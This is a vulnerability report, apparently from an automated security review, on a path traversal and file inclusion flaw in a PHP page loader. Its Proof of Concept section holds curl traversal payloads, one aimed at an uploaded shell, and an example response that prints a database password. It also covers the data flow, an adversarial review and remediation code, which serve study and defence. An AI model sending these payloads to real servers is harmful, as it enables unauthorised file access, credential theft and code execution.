# Vulnerability: Path Traversal — Arbitrary File Inclusion

## Summary
The dynamic page loader at `/page.php` is vulnerable to path traversal attacks. An attacker can control the 'page' parameter which is directly used in an include statement without sanitization, allowing the inclusion of arbitrary files from the filesystem.

## Confidence
High
(Found by both Sink→Source and Source→Sink taint analysis with fully cited path and survived all 3 adversarial attacks.)

## Authentication Requirement
Unauthenticated

## Attack Surface Location
- **Endpoint:** `GET /page.php?page=<value>`
- **Handler:** `include` at page.php:6
- **Framework protections bypassed:** AumWAF provides no protection against this pattern

## Attack Chain
1. Initial access: Any unauthenticated user can access the application
2. Endpoint interaction: Attacker accesses /page.php with a crafted 'page' parameter
3. Malicious input: Attacker provides path traversal patterns like '../' in the 'page' parameter
4. Sink execution: The application directly includes the user-controlled file path without validation
5. Post-exploitation: Attacker can read/execute arbitrary files on the server
6. Final impact: Information disclosure and potential remote code execution if attacker can write files to the server

## Data Flow
- **Source (user input):** get('page') from HTTP GET parameter
- **Sink:** `include $page . '.php'` at page.php:6

```
GET parameter 'page' → get('page') → $page → include $page . '.php' [page.php:6]
```

## Proof of Concept

### Prerequisites
- No authentication required

### Exploit Request
```bash
# Path traversal to read config file:
curl "http://example.com/page.php?page=../config"

# Path traversal to read database connection info:
curl "http://example.com/page.php?page=../s3cretadm1n/index"

# Local file inclusion of uploaded files (if any upload functionality exists):
curl "http://example.com/page.php?page=../uploads/shell"
```

### Expected Vulnerable Response
For the config.php file:
```http
HTTP/1.1 200 OK
Content-Type: text/html

<?php

$_CONFIG = [
    'database' => [
        'host' => 'lazyweb-db',
        'user' => 'user',
        'pass' => 'snf1AvQ74DtF1PJp',
        'dbnm' => 'user'
    ],
    'user' => [
        'encrypt_password' => true,
        'encrypt_algo' => PASSWORD_BCRYPT
    ],
    'debug' => (!empty($_REQUEST['debug'])) ? true : false
];
```

### Expected Patched Response
```http
HTTP/1.1 404 Not Found
Content-Type: text/html

Page not found
```

### Impact Demonstration
An attacker can read configuration files containing database credentials, source code of other pages, or potentially execute PHP code if they can control the file being included.

## Affected Code
```php
// page.php:6
include $page . '.php';
```

## Adversarial Review
Independent reviewer: `security_reviewer_adversary` (did not author this finding).

- **Reachability attack — FAILED to kill.** The endpoint is reachable from external network at `/page.php` without any authentication requirement. The code at page.php:4-6 directly includes a user-controlled file path.
- **Impact attack — FAILED to kill.** The path traversal vulnerability allows reading arbitrary files from the filesystem, which is clearly a Sensitive Data Disclosure vulnerability. The direct use of user input in an include statement at page.php:6 demonstrates the vulnerability.
- **Validity attack — FAILED to kill.** There is no input sanitization or validation. The code at page.php:6 directly includes a user-controlled file path without any checks for path traversal or directory restrictions. The WAF in AumWAF.class.php only checks for specific scanner signatures but not for path traversal patterns.

**Verdict: SURVIVED** (all three attacks failed).

## Remediation
1. Use an allowlist of valid page names:
   ```php
   $allowed_pages = ['index', 'core', 'about', 'contact', 'user/login', 'user/register'];
   $page = get('page', 'index');
   
   if (!in_array($page, $allowed_pages)) {
       $page = 'index';
   }
   
   include $page . '.php';
   ```
2. Alternatively, sanitize the input:
   ```php
   $page = basename(get('page', 'index'));
   include $page . '.php';
   ```
3. If possible, restructure the application to use proper routing instead of dynamic includes
4. Ensure that files that should not be accessed via web are placed outside the webroot or properly protected by file permissions